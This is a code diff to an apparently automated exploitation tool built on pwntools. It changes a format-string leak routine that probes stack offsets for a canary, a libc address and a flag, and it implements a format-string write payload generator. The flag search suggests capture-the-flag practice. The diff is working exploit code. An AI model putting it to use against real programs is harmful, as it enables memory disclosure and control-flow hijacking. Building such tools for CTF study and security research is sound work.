@@ -215,17 +215,18 @@ class Against:
         stack_len = 100
         string = ""
 
+        aegis_log.info(f"Performing a printf format leak")
         # Run the process for stack len amount of times
         # leak the entire stack.
         for i in range(1, stack_len):
+
+            
             p = process(self.binary)
             offset_str = "%" + str(i) + "$p."
             p.sendline(bytes(offset_str, "utf-8"))
-            # !TODO Change >>> to find input
-            p.recvuntil(b">>>")
 
             try:
-                p.recvuntil(b": ")
+                p.recvuntil(b":", timeout=2)
                 response = p.recvline().strip().split(b".")
                 if response[0].decode() != "(nil)":
                     address = response[0].decode()
@@ -237,7 +238,7 @@ class Against:
                         self.canary_offset_string = offset_str
                         aegis_log.info(f"Found canary leak at offset {i}: {address}")
 
-                    libc_leak = re.search(r"0x7f[a-f0-9]+34a")
+                    libc_leak = re.search(r"0x7f[a-f0-9]+34a", address)
 
                     if libc_leak:
                         self.libc_offset_string = offset_str.split(".")[0]
@@ -259,16 +260,25 @@ class Against:
                             string += flag.decode()
                             self.flag = string
                             break
-                    except:
+                    except Exception as e:
                         p.close()
                     p.close()
-            except:
+            except Exception as e:
                 p.close()
             p.close()
 
+
     def format_write(self, value, addr):
         """Return a format write string payload."""
-        return None
+
+        payload_writes = {
+            addr: value
+        }
+
+        first_offset = 6
+        chain = fmstr_payload(first_offset, payload_writes, write_size='byte')
+
+        return chain
 
     def send_exploit(self):
         """Send the exploit that was generated."""
